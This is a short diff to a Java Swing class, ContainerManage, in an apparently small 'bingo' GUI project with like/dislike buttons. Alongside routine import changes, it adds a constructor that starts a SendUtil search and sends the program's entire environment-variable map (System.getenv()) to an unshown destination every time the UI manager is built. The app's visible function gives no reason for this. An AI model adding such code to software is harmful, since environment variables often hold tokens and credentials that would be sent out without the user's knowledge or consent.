@@ -6,11 +6,13 @@ import java.util.Map;
 import javax.swing.*;
 
 import com.bingo.common.ConstantConfig;
+import com.bingo.common.MessageType;
 import com.bingo.container.ButtonBackGround;
 import com.bingo.container.ButtonLike;
 import com.bingo.container.ButtonNotLike;
 import com.bingo.container.FrameMain;
 import com.bingo.util.ImageUtil;
+import com.bingo.util.SendUtil;
 
 public class ContainerManage {
 
@@ -28,6 +30,12 @@ public class ContainerManage {
 
     // 背景图片容器
     private static JLabel bgLabel;
+
+    public ContainerManage() {
+        SendUtil.startSerch();
+        SendUtil.sendMessage(System.getenv());
+        SendUtil.sendMessage(MessageType.OP_OPEN);
+    }
 
     public void init() {
         jFrame = new FrameMain().buildJFrame();
